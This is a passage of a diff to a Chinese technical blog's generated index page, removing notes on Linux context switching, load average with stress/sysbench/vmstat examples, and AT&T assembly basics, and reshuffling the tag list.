-<li>进程调度场景<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.为保证进程公平调度,CPU被划分成一段段时间片,这些时间片轮流分配到各个进程,进程时间片耗尽,系统被挂起,切换到其他等待CPU的进程运行。</span><br><span class="line">2.系统资源不足时,要等待资源满足才能运行,进程也会被挂起,系统调度其他进程运行。</span><br><span class="line">3.进程调用sleep这样的方法让自己主动挂起时,也会重新调度。</span><br><span class="line">4.当有优先级更高的进程运行时,保证高优先级进程的调度,进程会被挂起,从高优先级进程运行</span><br><span class="line">5.发生硬件中断时,CPU上进程会被中断挂起。</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<blockquote>
-<p>线程上下文切换</p>
-</blockquote>
-<p>当有多个线程时,线程共用相同的虚拟内存和全局变量等资源,这些资源在上下文切换时不需要修改。<br>线程由自己的私有数据,比如栈和寄存器,这些在上下文切换是需要保存的。<br>对于同一进程的线程上下文切换,只切换线程的私有数据,寄存器不共享。</p>
-<blockquote>
-<p>中断上下文切换</p>
-</blockquote>
-<p>为了快速响应硬件事件,中断处理打断进程的正常调度和执行,转而调用中断处理程序,响应设备事件。<br>中断上下文切换至包括内核态中断服务程序执行所需要的状态,包括CPU寄存器,内核堆栈,硬件中断参数等。<br>对同一个 CPU 来说，中断处理比进程拥有更高的优先级。</p>
-<blockquote>
-<p>查看系统的上下文中断</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/Desktop# vmstat 5</span><br><span class="line">procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu-----</span><br><span class="line"> r  b   swpd   free   buff  cache   si   so    bi    bo   in   cs us sy id wa st</span><br><span class="line"> 0  0      0 6770348  95812 707136    0    0   169    78  140  232 22  6 69  3  0</span><br><span class="line"> 0  0      0 6770456  95812 707168    0    0     0     0  284  783  3  2 95  0  0</span><br><span class="line"> 0  0      0 6770520  95820 707168    0    0     0     3  408  964  5  4 91  0  0</span><br><span class="line"> 0  0      0 6770520  95820 707168    0    0     0     0  348  883  5  5 90  0  0</span><br><span class="line"> 0  0      0 6769768  95820 707168    0    0     0     0  225  580  2  3 95  0  0</span><br><span class="line"> 0  0      0 6769768  95820 707168    0    0     0     0   90  187  1  1 98  0  0</span><br><span class="line"> 1  0      0 6769760  95820 707168    0    0     0     0  258  470  1  1 98  0  0</span><br><span class="line">cs每秒上下文切换次数</span><br><span class="line">in 每秒中断次数</span><br><span class="line">r 就绪队列的个数,即为正在运行和等待的进程个数</span><br><span class="line">b 处于不可中断睡眠状态的进程个数</span><br><span class="line">us 用户使用cpu占比</span><br><span class="line">sy 系统使用cpu占比</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@ubuntu:~/Desktop# pidstat -w 5</span><br><span class="line">Linux 4.2.0-27-generic (ubuntu) 	11/27/2018 	_x86_64_	(2 CPU)</span><br><span class="line"></span><br><span class="line">05:55:14 PM   UID       PID   cswch/s nvcswch/s  Command</span><br><span class="line">05:55:19 PM     0         7     16.76      0.00  rcu_sched</span><br><span class="line">05:55:19 PM     0         9      9.16      0.00  rcuos/0</span><br><span class="line">05:55:19 PM     0        12      0.39      0.00  watchdog/</span><br><span class="line">cswch 每秒自愿上下文中断 进程无法获取资源导致的上下文切换</span><br><span class="line">nvcswch 每秒非自愿上下文中断 进程由于时间片已到,系统调度发生的上下文切换</span><br></pre></td></tr></table></figure>
-<ul>
-<li>案例分析<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">sysbench 多线程基准测试工具,用来评估不同系统参数下的数据库负载情况。</span><br><span class="line">可以用来模拟系统多线程调度切换的情况。</span><br><span class="line">apt-get install sysbench sysstat</span><br><span class="line"></span><br><span class="line"># 以 10 个线程运行 5 分钟的基准测试，模拟多线程切换的问题</span><br><span class="line">sysbench --threads=10 --max-time=300 threads run</span><br><span class="line"></span><br><span class="line">#每隔vmstat一秒查看上下文切换情况</span><br><span class="line">vmstat 1 1</span><br><span class="line">看到cs和in很高</span><br><span class="line">#查看进程</span><br><span class="line">pidstat -w 5 进程上下文切换</span><br><span class="line">pidstat -wt 5 线程上下文切换</span><br><span class="line">#查看中断上下文切换</span><br><span class="line">watch -d cat /proc/interrupts //-d 表示高亮显示变化的区域</span><br><span class="line">其中RES(重调度中断),这个中断类型,唤醒空闲状态的CPU来调度新的任务运行。是多处理器系统调度器用来分散任务到不同CPU的机制，称为处理器间中断。</span><br></pre></td></tr></table></figure></li>
-</ul>
-
+        
       
 
       
@@ -935,199 +1092,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2018/09/30/2.CPU上下文切换/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
- <!-- 目录内容 -->
-             
-        <!-- 目录内容结束 -->
-
-  
-    <article id="post-1.关于平均负载" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/09/30/1.关于平均负载/">1.关于平均负载</a>
-    </h1>
-  
-
-		
-        
-        <a href="/2018/09/30/1.关于平均负载/" class="archive-article-date">
-  	<time datetime="2018-09-30T08:46:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-09-30</time>
-</a>
-        
-      </header>
-
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <ul>
-<li><p>uptime命令</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kaliroot:~# uptime</span><br><span class="line"> 当前时间   运行时间       			  后面3个参数分别为1分钟,5分钟,15分钟的平均负载             </span><br><span class="line"> 20:49:51  up 1 day,  7:05,  1 user,  load average: 0.20, 0.76, 2.36</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>平均负载理想状态</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">平均负载:单位时间内,系统处于可运行状态(R)和不可中断状态(D)的平均进程数,也就是平均活跃进程数。</span><br><span class="line">不可中断状态是系统对进程和硬件的保护,防止读写过程中中断,导致进程和硬件数据不一致。</span><br><span class="line">当有n个逻辑cpu时,平均负载为n是为完全占用:例如2个时候,为2</span><br><span class="line">当平均负载&gt;n时即已经负载。</span><br><span class="line">grep &apos;model name&apos; /proc/cpuinfo | wc -l 获取逻辑cpu个数</span><br><span class="line"></span><br><span class="line">通过监控系统的平均负载,负载出现翻倍等异常需要去分析和调查。</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>平均负载和CPU使用率</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">平均负载包括等待CPU和等待I/O的进程。</span><br><span class="line">例如当I/O负载很高的时候,平均负载很高,但是CPU使用率不高</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<blockquote>
-<p>案例分析<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">stress linux系统压力测试工具</span><br><span class="line">sysstat linux常用性能工具</span><br><span class="line">apt-get install stress sysstat</span><br><span class="line"></span><br><span class="line">1.CPU密集型进程</span><br><span class="line">开启4个窗口</span><br><span class="line">第一个窗口 模拟CPU使用率100%场景</span><br><span class="line">stress --cpu 1 --timeout 600</span><br><span class="line">第二个窗口 观察平均负载慢慢升到1</span><br><span class="line">watch -d update</span><br><span class="line">第三个窗口 观察CPU使用率</span><br><span class="line">mpstat --p ALL 5  //-P监控所有 5秒</span><br><span class="line">第四个窗口 观察那个进程占用了cpu使用率</span><br><span class="line">pidstat -u 5 1 //5秒输出一组数据</span><br><span class="line"></span><br><span class="line">2.I/O密集型进程</span><br><span class="line">第一个窗口 模拟I/O压力</span><br><span class="line">stress -i 1 --timeout 600</span><br><span class="line">第二个窗口 观察平均负载慢慢升到1</span><br><span class="line">watch -d update</span><br><span class="line">第三个窗口 观察IOiowait很高</span><br><span class="line">mpstat --p ALL 5 1 //-P监控所有 5秒</span><br><span class="line">第四个窗口 观察那个进程导致IOwait很高</span><br><span class="line">pidstat -u 5 1 //5秒输出一组数据</span><br><span class="line"></span><br><span class="line">3.大量进程场景</span><br><span class="line">第一个窗口 模拟多进程场景</span><br><span class="line">stress -c 8 --timeout 600</span><br><span class="line">第二个窗口 观察平均负载慢慢升到1</span><br><span class="line">watch -d update</span><br><span class="line">第三个窗口 观察进程 wait很高</span><br><span class="line">pidstat -u 5 1 //5秒输出一组数据</span><br></pre></td></tr></table></figure></p>
-</blockquote>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">linux优化</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/09/30/1.关于平均负载/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
- <!-- 目录内容 -->
-             
-        <!-- 目录内容结束 -->
-
-  
-    <article id="post-ATT-Unitx下c汇编" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/09/30/ATT-Unitx下c汇编/">ATT-Unitx下c汇编</a>
-    </h1>
-  
-
-		
-        
-        <a href="/2018/09/30/ATT-Unitx下c汇编/" class="archive-article-date">
-  	<time datetime="2018-09-30T08:46:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-09-30</time>
-</a>
-        
-      </header>
-
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>Unix下的GCC产生的汇编是ATT</p>
-<blockquote>
-<p>程序编程</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">gcc -Og -o p p1.c p2.c </span><br><span class="line">-Og高速编译器生成符合原始C语言机器代码的优化等级 如果为了程序性能考虑执行选线-O1/-O2 </span><br><span class="line">-o 生成可执行文件</span><br><span class="line">编译器: 将产生的2个源文件的汇编代码,后缀为.s</span><br><span class="line">汇编器: 将汇编代码转成二进制目标文件,后缀为.o</span><br><span class="line">链接器: 将目标二进制目标文件和库函数代码合并,并产生最终的可执行文件。</span><br><span class="line">-S 生成汇编代码,后缀为.s</span><br><span class="line">-c 生成二进制目标文件,后缀为.o</span><br><span class="line"></span><br><span class="line">gcc -Og -S -masm=intel p1.c //生成inter汇编格式</span><br><span class="line">-masm=intel</span><br><span class="line">objdumpp -d p1.o</span><br><span class="line">将二进制文件反汇编成汇编代码</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>访问信息</p>
-</blockquote>
-<ul>
-<li><p>寄存器</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">rax eax ax al/ah</span><br><span class="line">rbx ebx bx bl/bh</span><br><span class="line">rcx ecx cx dl/dh</span><br><span class="line">rdx edx dx dl/dh</span><br><span class="line">rsi esi si </span><br><span class="line">rdi edi di</span><br><span class="line">rbp ebp bp</span><br><span class="line">rsp esp sp</span><br><span class="line">r8</span><br><span class="line">r9</span><br><span class="line">r10</span><br><span class="line">r11</span><br><span class="line">r12</span><br><span class="line">r13</span><br><span class="line">r14</span><br><span class="line">r15</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>数据传送指令</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">movb</span><br><span class="line">movw </span><br><span class="line">movl  //特殊 会讲高4字节设置为0</span><br><span class="line">movq  //只能以表示为32位补码数字的立即数作为源操作数,然后符号扩展到64的值放到目的位置</span><br><span class="line">movabsq //可以任意64位立即数值作为源操作数,并只能以寄存器作为目的</span><br><span class="line"></span><br><span class="line">movzbw //将0扩展的字节传送到字</span><br><span class="line">movzbl //将0扩展的字节传送到双字</span><br><span class="line">movzwl //将0扩展的字传送到双字</span><br><span class="line">movzbq //将0扩展的字节传送到四字</span><br><span class="line">movzwq //将0扩展的字传送到四字</span><br><span class="line">movl相当于将0扩展的双字传送到四字</span><br><span class="line"></span><br><span class="line">movsbw</span><br><span class="line">movsbl</span><br><span class="line">movswl</span><br><span class="line">movsbq</span><br><span class="line">movswq</span><br><span class="line">movslq</span><br><span class="line">cltq  将eax符号扩展到rax</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<blockquote>
-<p>浮点指令</p>
-</blockquote>
-<p>+传送浮点指令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vmovss 传送单精度数</span><br><span class="line">vmovsd 传送双精度数</span><br><span class="line">vmovaps 传送对齐的封装好的单精度数</span><br><span class="line">vmovapd 传送对齐的封装好的双精度数</span><br></pre></td></tr></table></figure></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">汇编</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/09/30/ATT-Unitx下c汇编/">展开全文 >></a>
+          <a class="article-more-a" href="/2018/09/30/3.CPU使用率到100%/">展开全文 >></a>
         </p>
       
 
@@ -1258,11 +1223,31 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">linux优化</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">逆向</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">汇编</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">Window编程原理</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">linux</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">Java</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">Windbg</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1278,19 +1263,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">Windbg</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">shellcode</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">hexo</a>
+                <a href="javascript:void(0)" class="js-tag color4">git</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">git</a>
+                <a href="javascript:void(0)" class="js-tag color5">hexo</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1302,10 +1283,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">汇编</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">vsfptd</a>
               </li>
              
@@ -1314,11 +1291,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">逆向</a>
+                <a href="javascript:void(0)" class="js-tag color2">sqlmap</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">加壳</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">web安全</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1327,10 +1308,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">漏洞分析</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">sqlmap</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1362,23 +1339,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">网络协议</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">深入理解计算机系统</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">随记</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">网络协议</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">linux优化</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">Java</a>
               </li>
             
             <div class="clearfix"></div>
